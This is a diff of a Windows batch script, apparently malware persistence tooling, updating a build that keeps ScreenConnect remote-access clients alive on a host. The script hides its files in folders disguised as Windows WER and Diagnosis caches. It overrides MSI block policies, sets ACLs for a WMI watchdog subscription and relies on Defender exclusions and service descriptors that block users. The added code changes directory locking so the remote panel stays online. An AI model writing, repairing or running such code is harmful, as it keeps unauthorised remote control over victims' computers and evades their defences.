@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S7 - gryxa keep + identity-aware task ACL + DisableMSI neutralize + exclusions/ACL; no attr-lock on mutable payloads
+REM OWN_SECURE BUILD 20260802S8 - gryxa keep; NO LockDir on SC dirs (offline fix); DisableMSI neutralize; exclusions; service SD
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -16,7 +16,7 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S7>>"%LOG%"
+echo secure_begin %DATE% %TIME% S8>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
@@ -81,19 +81,32 @@ powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
 REM --- ACL: WMI watchdog subscription files (chain 2) ---
 icacls "%SystemRoot%\System32\wbem\Repository" /grant "NT AUTHORITY\SYSTEM:F" >nul 2>&1
 
-REM --- ACL: keep ScreenConnect install dirs (once; takeown every tick is noisy) ---
-if not exist "%WD%\secure_sc.flag" (
-  for %%D in (
-    "%PF%\ScreenConnect Client (%KEEP1%)"
-    "%PF%\ScreenConnect Client (%KEEP2%)"
-    "%PF%\ScreenConnect Client (%KEEP3%)"
-    "%PF86%\ScreenConnect Client (%KEEP1%)"
-    "%PF86%\ScreenConnect Client (%KEEP2%)"
-    "%PF86%\ScreenConnect Client (%KEEP3%)"
-  ) do (
-    if exist "%%~D" call :LockDir "%%~D"
+REM --- ACL: do NOT LockDir ScreenConnect install dirs ---
+REM takeown+strip on live SC dirs breaks client file writes/updates → panel OFFLINE
+REM while service still looks Running. Defender exclusions + service SD are enough.
+REM O37: one-shot unlock if a prior build LockDir'd these paths.
+if exist "%WD%\secure_sc.flag" (
+  findstr /C:"sc_nolock_dirs" "%WD%\secure_sc.flag" >nul 2>&1
+  if errorlevel 1 (
+    echo sc_unlock_prior_lockdir>>"%LOG%"
+    for %%D in (
+      "%PF%\ScreenConnect Client (%KEEP1%)"
+      "%PF%\ScreenConnect Client (%KEEP2%)"
+      "%PF%\ScreenConnect Client (%KEEP3%)"
+      "%PF86%\ScreenConnect Client (%KEEP1%)"
+      "%PF86%\ScreenConnect Client (%KEEP2%)"
+      "%PF86%\ScreenConnect Client (%KEEP3%)"
+    ) do (
+      if exist "%%~D" (
+        takeown /F "%%~D" /R /D Y >nul 2>&1
+        icacls "%%~D" /reset /T /C /Q >nul 2>&1
+        icacls "%%~D" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1
+      )
+    )
+    echo sc_nolock_dirs>%WD%\secure_sc.flag
   )
-  echo sc_locked>%WD%\secure_sc.flag
+) else (
+  echo sc_nolock_dirs>%WD%\secure_sc.flag
 )
 
 REM --- SC services: SYSTEM can config/stop/delete; BA full; users blocked ---
